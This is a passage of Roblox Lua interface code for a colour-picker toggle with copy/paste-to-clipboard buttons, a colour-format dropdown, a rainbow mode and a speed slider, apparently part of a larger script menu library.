								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end


								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000






								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300) --edit second value (10 or 20 or 30 i forgor)
								Frame.Visible = false 
								Frame.ZIndex = 4

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000
								Button5.Position = C.UDIM2(0, -20, 0.6, 0) --edit here
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 4

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 4

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 4
								CopyColorsType = "RGB"
								Button_25.MouseButton1Down:Connect(function() 
										TextLabel5.TextColor3 = MainUIColor 
										library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local retarded, lmao = pcall(function()
									
											local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)

											if CopyColorsType == 'RGB' then
												setclipboard(''..l..','..m..','..a) -- o
											elseif CopyColorsType == 'HEX' then
												setclipboard(toHex(C.COL3RGB(l,m,a)))
											elseif CopyColorsType == 'HSV' then 
												local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
												setclipboard(''..H..','..S..','..V)
											end
										end)
											if retarded then
												TextLabel5.Text = 'Success!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
											else
												TextLabel5.Text = 'Error!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
												print(lmao)
												print(Element.value.Color)
												print(Element.value.Color.value)
											end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 								
								
								
								
								
								
								
								
								
								do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0.6, 20) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end
								
								
								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0.6, 60) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors (RGB only)' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = MainUIColor 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColorTable = {'false','false','false'}
									local IsAColor = false
									if #colors == 3 then
										for i = 1, #colors do
											if tonumber(colors[i]) then
												IsAColorTable[i] = 'true'
											end
										end
										if IsAColorTable[1] == 'true' and IsAColorTable[2] == 'true' and IsAColorTable[3] == 'true' then
											IsAColor = true
										end
									else
										IsAColor = false
									end
									
									if IsAColor then
										local retarded, lmao = pcall(function()
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
												ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

												ColorH = C.CLAMP(ColorH,0,1) 
												ColorS = C.CLAMP(ColorS,0,1) 
												ColorV = C.CLAMP(ColorV,0,1) 
												ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
												Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

												ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
												Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
												values[tabname][sectorname][text] = Element.value 
												Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
												callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors (RGB only)'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors (RGB only)'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors (RGB only)"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								
								
								
								
								-------------------------------------------------------------------
									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 
									
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0.6, 80) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = MainUIColor 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 				
										--values[tabname][sectorname][tabtext][text] = Element.value 
										--callback(Element.value) 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then
													--Element.value.RainbowSpeed
														ColorH, ColorS, ColorV = (tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed),1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--        library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)
												end
											end)									
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0.6, 93) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 4

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 4

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 4

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 4
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) or 0 
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 							
								---------------------------------------------------------------------------------------------------------------------
								
								
								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 4 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 4

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = false 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 4

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

